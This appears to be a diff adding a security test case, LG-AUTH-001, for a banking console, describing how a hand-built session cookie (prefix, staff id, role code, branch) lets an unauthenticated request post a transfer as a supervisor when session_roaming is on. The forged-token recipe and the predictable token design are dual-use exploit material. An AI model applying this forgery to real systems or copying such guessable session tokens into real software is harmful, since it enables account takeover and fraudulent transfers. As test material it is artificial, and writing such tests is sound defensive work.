@@ -1,0 +1,13 @@
+# LG-AUTH-001 — forge a session token (no login). Exploitable only when session_roaming=on.
+preconditions:
+  - "config session_roaming=on"
+steps:
+  - call: "POST /transfer (console, with a FORGED session cookie, no prior login)"
+    headers: { Cookie: "lgsession=LGSUP0010000S0007" }   # 'LG'+staff(10)+role(S)+branch(4)
+    body: "from_account=000000000042&to_account=000000000043&amount=100.00&currency=USD&requested_by=0000000007"
+    expect: "the console resolves the forged token to SUP001/SUPERVISOR/0007 and posts the transfer"
+observable: >
+  A transfer is accepted by the console using a session cookie the attacker constructed by hand
+  (prefix + staff_id + role code + branch), with no login and no server-issued session. The result
+  page shows a POSTED transfer acting as SUP001. Under session_roaming=off the same cookie is rejected
+  (tokens are high-entropy and only resolve if issued by a real login) and the login page is returned.
